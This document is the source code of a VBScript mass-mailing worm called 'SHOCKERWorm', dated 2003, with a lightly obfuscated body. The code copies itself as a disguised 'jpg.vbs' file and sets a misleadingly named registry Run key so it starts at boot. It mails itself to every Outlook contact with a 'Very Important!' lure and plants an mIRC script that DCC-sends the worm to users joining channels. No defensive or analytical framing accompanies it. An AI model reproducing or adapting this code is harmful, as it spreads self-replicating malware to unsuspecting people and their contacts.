   SHOCKERWorm Created By SHELL SHOCK. 2/18/2003
   Set J1HOBQ6B = createobject("scripting.filesystemobject")
   KSQNN69I = J1HOBQ6B.getspecialfolder(0)
   S225C4AD = KSQNN69I & "\SHOCKER_Worm.jpg.vbs"
   Set V46HU8JB = createobject("wscript.shell")
   V46HU8JB.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & S225C4AD & " %"
   J1HOBQ6B.copyfile wscript.scriptfullname, S225C4AD
   P80O6ULQ
   If V46HU8JB.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\SHOCKERWorm\PROJH028") <> 1 then
   FU3A1865
   End if
   If V46HU8JB.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\SHOCKERWorm\U8SR7G61") <> 1 then
   C6QJ5AVC ""
   End if
   Function FU3A1865()
   Set K5BL21UF = CreateObject("Outlook.Application")
   If K5BL21UF = "Outlook" Then
   Set GA3DCQD4 = K5BL21UF.GetNameSpace("MAPI")
   Set G98F8H51 = GA3DCQD4.AddressLists
   For Each SAR3742L In G98F8H51
   If SAR3742L.AddressEntries.Count <> 0 Then
   EH532788 = SAR3742L.AddressEntries.Count
   For ICAM18EU = 1 To EH532788
   Set J0B7A470 = K5BL21UF.CreateItem(0)
   Set F60F635U = SAR3742L.AddressEntries(ICAM18EU)
   J0B7A470.To = F60F635U.Address
   J0B7A470.Subject = "Very Important!"
   J0B7A470.Body = "Hi:" & vbcrlf & "Please view this file, it's very important." & vbcrlf & ""
   execute "set U3G3T8DJ =J0B7A470." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
   D2QVN676 = S225C4AD
   J0B7A470.DeleteAfterSubmit = True
   U3G3T8DJ.Add D2QVN676
   If J0B7A470.To <> "" Then
   J0B7A470.Send
   End If
   Next
   End If
   Next
   End If
   End function
   Function C6QJ5AVC(R10JSS6Q)
   If R10JSS6Q <> "" Then
   OEO543L8 = V46HU8JB.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   If J1HOBQ6B.fileexists("c:\mirc\mirc.ini") Then
   R10JSS6Q = "c:\mirc"
   ElseIf J1HOBQ6B.fileexists("c:\mirc32\mirc.ini") Then
   R10JSS6Q = "c:\mirc32"
   ElseIf J1HOBQ6B.fileexists(OEO543L8 & "\mirc\mirc.ini") Then
   R10JSS6Q = OEO543L8 & "\mirc"
   ElseIf J1HOBQ6B.fileexists(OEO543L8 & "\mirc32\mirc.ini") Then
   R10JSS6Q = OEO543L8 & "\mirc"
   Else
   R10JSS6Q = ""
   End If
   End If
   If R10JSS6Q <> "" Then
   Set MAL0E6QA = J1HOBQ6B.CreateTextFile(R10JSS6Q & "\script.ini", True)
   MAL0E6QA = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
   MAL0E6QA = MAL0E6QA & vbCrLf & "n0=on 1:JOIN:#:{"
   MAL0E6QA = MAL0E6QA & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
   MAL0E6QA = MAL0E6QA & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
   MAL0E6QA = MAL0E6QA & S225C4AD
   MAL0E6QA = MAL0E6QA & vbCrLf & "n3=}"
   script.Close
   End If
   End Function
   Function P80O6ULQ()
   Randomize
   If 1 + Int(Rnd * 5) = 7 then
   Msgbox "I've nothing to say. :o)",64,":o)"
   end if
   end function
